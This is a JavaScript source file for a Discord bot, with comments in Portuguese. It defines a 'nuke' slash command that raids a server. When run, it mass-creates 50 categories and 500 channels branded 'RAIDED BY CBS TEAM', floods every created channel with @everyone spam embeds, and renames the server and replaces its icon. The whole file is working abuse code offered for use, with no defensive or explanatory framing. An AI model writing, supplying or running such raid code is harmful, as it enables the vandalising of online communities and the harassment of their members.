const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const config = require('../config');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('💀 CRIAÇÃO ULTRA RÁPIDA - 500 canais + spam')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Apenas ADMs.', flags: 64 });
    }

    const botMember = interaction.guild.members.cache.get(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Me dê ADM.', flags: 64 });
    }

    await interaction.deferReply({ flags: 64 });
    const guild = interaction.guild;
    const user = interaction.user;
    const base = 'RAIDED-BY-CBS';
    const mensagem = config.raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';

    const startTime = Date.now();

    try {
      // ===== 1. CRIAR CATEGORIAS (PARALELO) =====
      await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
      const categoryPromises = [];
      for (let i = 0; i < 50; i++) {
        categoryPromises.push(
          guild.channels.create({
            name: `${base}-CAT-${i+1}`,
            type: ChannelType.GuildCategory,
            reason: 'RAID CBS'
          }).catch(() => null)
        );
      }
      const categories = (await Promise.all(categoryPromises)).filter(c => c !== null);

      // ===== 2. CRIAR 500 CANAIS EM LOTES DE 50 (PARALELO) =====
      await interaction.editReply('📂 CRIANDO 500 CANAIS EM LOTE...');
      const totalCanais = 500;
      const batchSize = 50; // aumenta para 50 por vez
      const channels = [];

      for (let i = 0; i < totalCanais; i += batchSize) {
        const batch = [];
        const end = Math.min(i + batchSize, totalCanais);
        for (let j = i; j < end; j++) {
          const cat = categories[j % categories.length] || null;
          batch.push(
            guild.channels.create({
              name: `${base}-CH-${j+1}`,
              type: ChannelType.GuildText,
              parent: cat?.id || null,
              topic: 'RAIDED BY CBS TEAM'
            }).catch(() => null)
          );
        }
        const created = await Promise.all(batch);
        channels.push(...created.filter(c => c !== null));
        // Atualiza progresso a cada lote
        await interaction.editReply(`📂 ${channels.length}/${totalCanais} canais criados`);
      }

      // ===== 3. SPAM EM PARALELO (TODOS OS CANAIS DE UMA VEZ) =====
      await interaction.editReply(`💬 SPAMMANDO ${channels.length} CANAIS...`);
      const msgPromises = channels.map(channel =>
        channel.send({
          content: `@everyone ${mensagem}`,
          embeds: [{
            title: 'CBS TEAM ESTEVE AQUI!',
            description: `💀 RAID por ${user.tag}`,
            color: 0xFF0000,
            image: { url: config.raid.gifUrl },
            timestamp: new Date()
          }]
        }).catch(() => null)
      );
      await Promise.all(msgPromises);

      // ===== 4. MUDAR NOME E FOTO =====
      try {
        await guild.setName('RAIDED BY CBS TEAM');
        if (client.user.avatarURL()) {
          const avatar = await fetch(client.user.avatarURL({ size: 256, extension: 'png' }));
          const buffer = await avatar.buffer();
          await guild.setIcon(buffer);
        }
      } catch {}

      // ===== 5. FINAL =====
      const tempo = Math.round((Date.now() - startTime) / 1000);
      await interaction.editReply(
        `✅ **NUKE ULTRA RÁPIDO CONCLUÍDO!**\n\n` +
        `📂 ${categories.length}/50 categorias\n` +
        `📂 ${channels.length}/500 canais\n` +
        `💬 ${channels.length} mensagens enviadas\n` +
        `⏱️ ${tempo}s`
      );

    } catch (error) {
      console.error('❌ ERRO NUKE:', error);
      await interaction.editReply(`❌ ERRO: ${error.message}`);
    }
  }
};